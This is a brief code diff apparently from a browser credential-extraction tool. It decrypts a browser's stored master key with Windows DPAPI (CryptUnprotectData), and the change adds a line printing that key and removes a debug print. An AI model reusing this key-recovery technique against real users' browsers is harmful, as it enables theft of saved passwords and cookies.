@@ -439,10 +439,10 @@ class Browsers:
                     encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
 
                     self.EncryptionKey = Syscalls.CryptUnprotectData(encryptedKey)
+                    print(self.EncryptionKey)
                     return self.EncryptionKey
 
                 else:
-                    print("wthelly")
                     return None
         
         def Decrypt(self, buffer: bytes, key: bytes) -> str: # Decrypts the data using the encryption key
